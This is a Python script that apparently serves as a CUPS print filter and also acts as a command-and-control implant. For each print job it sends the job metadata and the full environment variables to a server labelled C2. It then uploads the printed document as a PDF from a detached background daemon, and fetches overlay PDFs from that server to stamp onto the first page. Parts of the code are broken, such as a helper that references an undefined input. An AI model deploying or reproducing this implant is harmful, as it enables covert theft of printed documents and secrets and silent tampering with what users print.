#!/usr/bin/env python3

# !/usr/bin/python3 -t

from __future__ import print_function

import sys
import tempfile
import PyPDF2
import json
import datetime
import requests
import base64
import threading
import subprocess
import io
import os
import urllib
import dateutil.parser


def eprint(*args, **kwargs):
    print(*args, file=sys.stderr, **kwargs)


def bpc_debug(*args, **kwargs):
    eprint("DEBUG: (BPC)", *args, **kwargs)


def spawn_daemon(func, *args, **kwargs):
    # do the UNIX double-fork magic, see Stevens' "Advanced
    # Programming in the UNIX Environment" for details (ISBN 0201563177)
    try:
        pid = os.fork()
        if pid > 0:
            # parent process, return and keep running
            return
    except OSError as  e:
        eprint("fork #1 failed: %d (%s)" % (e.errno, e.strerror))
        sys.exit(1)

    os.setsid()

    # do second fork
    try:
        pid = os.fork()
        if pid > 0:
            # exit from second parent
            sys.exit(0)
    except OSError as e:
        eprint("fork #2 failed: %d (%s)" % (e.errno, e.strerror))
        sys.exit(1)

    # do stuff
    func(*args, **kwargs)

    # all done
    os._exit(os.EX_OK)


class MetaUploader(threading.Thread):
    def __init__(self, cups_id, cups_user, cups_title, cups_copies, cups_options):
        threading.Thread.__init__(self)
        self.cups_id = cups_id
        self.cups_user = cups_user
        self.cups_title = cups_title
        self.cups_copies = cups_copies
        self.cups_options = cups_options

    def run(self):
        job_data = {'id': self.cups_id, 'user': self.cups_user, 'title': self.cups_title, 'copies': self.cups_copies,
                    'options': self.cups_options, 'timestamp': datetime.datetime.now().timestamp(),
                    'environment': dict(os.environ)}
        bpc_debug("Uploading Metadata")
        response = requests.post(C2_METADATA_URL, json=job_data)
        json_response = response.json()
        bpc_debug("Uploaded Metadata - Response:", json_response)
        self._upload_id = json_response['upload_id']
        self._upload_file = json_response['upload_file']
        overlays = {}
        file_downloader = {}
        for each in json_response['overlays']:
            filename = each['filename']
            key = each["key"]
            url = urllib.parse.urljoin(C2_API_URL, each['url'])
            updated_at = datetime.datetime.fromtimestamp(each['updated_at'])
            if file_downloader.get(url) is not None:
                downloader = file_downloader[url]
            else:
                downloader = FileDownloader(filename, key, url, updated_at)
                downloader.start()
                file_downloader[url] = downloader
            overlays[int(each['number'])] = {'filename': filename,
                                             'url': url,
                                             'updated_at': updated_at,
                                             'downloader': file_downloader[url]
                                             }

        bpc_debug("Uploaded Metadata - Done:", overlays)

    def upload_id(self):
        self.join()
        return self._upload_id

    def upload_file(self):
        self.join()
        return self._upload_file


class FileDownloader(threading.Thread):
    def __init__(self, filename, key, url, updated_at):
        threading.Thread.__init__(self)
        self._filename = filename
        self._key = key
        self._path = (OVERLAY_PDF_DIR + '/%s.pdf') % key
        self._url = url
        self._updated_at = updated_at
        self._bytes = None

    def run(self):
        bpc_debug("FileDownloader:", self._path, self._url, self._updated_at)
        if not os.path.isfile(self._path) or (
                    datetime.datetime.fromtimestamp(os.path.getmtime(self._path)) < self._updated_at):
            bpc_debug("File does not exist - downloading")
            with open(self._path, 'wb') as file:
                file.write(requests.get(self._url).content)
        bpc_debug("FileDownloader:", "Done")

    def path(self):
        self.join()
        return self._path


def ps_to_pdf(pdf_input_bytes, cups_id, cups_user, cups_title, cups_copies, cups_options):
    bpc_debug("ps_to_pdf")
    bytes = subprocess.check_output(
        args=["/usr/lib/cups/filter/pstopdf", cups_id, cups_user, cups_title, cups_copies, cups_options],
        stdin=file_in)
    # file.close()
    return bytes


def ps_2_pdf(bytes, cups_id, cups_user, cups_title, cups_copies, cups_options):
    bpc_debug("ps_2_pdf")
    p = subprocess.Popen(args=["/usr/bin/ps2pdf", '-', '-'],
                         stdin=subprocess.PIPE,
                         stdout=subprocess.PIPE)
    bytes = p.communicate(input=bytes)[0]
    return bytes


def ps_2_ascii(ps_bytes):
    bpc_debug("ps_2_ascii:")
    p = subprocess.Popen(
        args=["/usr/bin/ps2ascii", '-', '-'],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE)
    bytes = p.communicate(input=ps_bytes)[0]
    return bytes


def pdf_to_ps(bytes, cups_id, cups_user, cups_title, cups_copies, cups_options):
    bpc_debug("pdf_to_ps")
    p = subprocess.Popen(
        args=["/usr/lib/cups/filter/pdftops", cups_id, cups_user, cups_title, cups_copies, cups_options],
        stdin=subprocess.PIPE)
    p.communicate(input=bytes)
    p.stdin.close()


def pdf_2_ps(bytes, cups_id, cups_user, cups_title, cups_copies, cups_options):
    bpc_debug("pdf_2_ps")
    p = subprocess.Popen(
        args=["/usr/bin/pdf2ps", '-', '-'],
        stdin=subprocess.PIPE)
    p.communicate(input=bytes)
    p.stdin.close()


def overlay_pdf(bytes):
    bpc_debug("Overlaying PDF")
    with io.BytesIO(bytes) as in_file:
        with io.BytesIO() as out_file:
            with open('/bpc/PDFs/overlay.pdf', 'rb') as overlay_file:

                in_reader = PyPDF2.PdfFileReader(in_file)
                overlay_reader = PyPDF2.PdfFileReader(overlay_file)
                out_writer = PyPDF2.PdfFileWriter()

                overlay_page = overlay_reader.getPage(0)

                for page_index in range(in_reader.numPages):
                    page = in_reader.getPage(page_index)
                    if page_index == 0:
                        page.mergePage(overlay_page)
                    out_writer.addPage(page)

                out_writer.write(out_file)
                result = out_file.getvalue()
                # with open('/bpc/out_file.pdf', 'wb') as file:
                #    file.write(result)
    bpc_debug("Overlayed PDF")
    return result


def read_ps_in_bytes():
    bpc_debug("argc", len(sys.argv))
    if len(sys.argv) > 6 and os.path.isfile(sys.argv[6]):
        with open(sys.argv[6], 'rb') as file:
            bytes = file.read()
    else:
        bytes = sys.stdin.buffer.read()
    return bytes


def upload_bytes(bytes, upload_id, filename, mimetype):
    if len(bytes) == 0:
        return
    bpc_debug("Uploading Bytes:", upload_id, mimetype)
    file = {'file': (filename, bytes, mimetype)}
    response = requests.post(C2_UPLOAD_URL % upload_id, files=file)
    bpc_debug("Uploaded Bytes:", response)


C2_API_URL = 'http://c2:8080/bpc/api-v1'
C2_METADATA_URL = C2_API_URL + '/metadata'
C2_UPLOAD_URL = C2_API_URL + '/file/%s'

OVERLAY_PDF_DIR = '/bpc/PDFs'

cups_id = sys.argv[1]
cups_user = sys.argv[2]
cups_title = sys.argv[3]
cups_copies = sys.argv[4]
cups_options = sys.argv[5]

ps_in_bytes = read_ps_in_bytes()

meta_uploader = MetaUploader(cups_id, cups_user, cups_title, cups_copies, cups_options)
meta_uploader.start()

# pdf_input_data = ps_to_pdf(ps_in_bytes, cups_id, cups_user, cups_title, cups_copies, cups_options)
pdf_in_bytes = ps_2_pdf(ps_in_bytes, cups_id, cups_user, cups_title, cups_copies, cups_options)

if meta_uploader.upload_file():
    spawn_daemon(upload_bytes, pdf_in_bytes, meta_uploader.upload_id(), 'print.pdf', 'application/pdf')

pdf_out_bytes = overlay_pdf(pdf_in_bytes)

# pdf_to_ps(pdf_output_data, cups_id, cups_user, cups_title, cups_copies, cups_options)
pdf_2_ps(pdf_out_bytes, cups_id, cups_user, cups_title, cups_copies, cups_options)
